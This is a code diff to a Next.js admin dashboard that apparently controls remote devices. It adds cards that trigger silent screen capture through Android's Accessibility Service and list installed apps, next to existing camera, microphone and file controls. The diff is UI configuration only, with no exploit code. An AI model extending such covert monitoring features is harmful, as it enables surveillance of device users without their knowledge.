@@ -3,7 +3,7 @@ import { useEffect, useState } from 'react';
 import { useParams, useRouter } from 'next/navigation';
 import {
   ArrowLeft, Camera, Mic, FolderOpen, Shield,
-  Wifi, WifiOff, ChevronRight, Radio,
+  Wifi, WifiOff, ChevronRight, Radio, Monitor, AppWindow,
 } from 'lucide-react';
 import { adminApi } from '@/lib/adminApi';
 import PageLoader from '@/components/PageLoader';
@@ -54,6 +54,26 @@ const CARDS = [
     iconBg: 'bg-indigo-500/20',
     iconColor: 'text-indigo-400',
     types: ['lock_device', 'block_app', 'unblock_app'],
+  },
+  {
+    key: 'screenshot',
+    label: 'Screenshot',
+    desc: 'Capture the current screen silently via Accessibility Service',
+    icon: Monitor,
+    gradient: 'from-cyan-600 to-teal-700',
+    iconBg: 'bg-cyan-500/20',
+    iconColor: 'text-cyan-400',
+    types: ['take_screenshot'],
+  },
+  {
+    key: 'apps',
+    label: 'Installed Apps',
+    desc: 'List all user-installed apps on the device',
+    icon: AppWindow,
+    gradient: 'from-emerald-600 to-green-700',
+    iconBg: 'bg-emerald-500/20',
+    iconColor: 'text-emerald-400',
+    types: ['list_apps'],
   },
 ] as const;
 
